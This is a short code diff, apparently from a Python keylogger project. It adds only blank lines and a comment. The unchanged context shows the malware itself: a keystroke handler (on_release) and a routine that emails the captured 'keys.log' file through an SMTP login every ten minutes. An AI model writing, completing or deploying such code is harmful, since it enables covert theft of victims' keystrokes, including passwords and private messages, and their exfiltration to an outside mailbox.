@@ -26,6 +26,7 @@ def send_email():
 		part = MIMEBase("application", "octet-stream")
 		part.set_payload(attachment.read())
 	encoders.encode_base64(part)
+	
 	part.add_header(
 		"Content-Disposition",
 		'attachment; filename = "keys.log"'
@@ -38,9 +39,10 @@ def send_email():
 		server.starttls(context=context)
 		server.login(sender_email, password)
 		server.sendmail(sender_email, receiver_email, text)
+		
 	time.sleep(600)
 
-
+# This function gets called automatically whenever the user types something
 def on_release(key):
 	if key == keyboard.Key.space:
 		key = " "
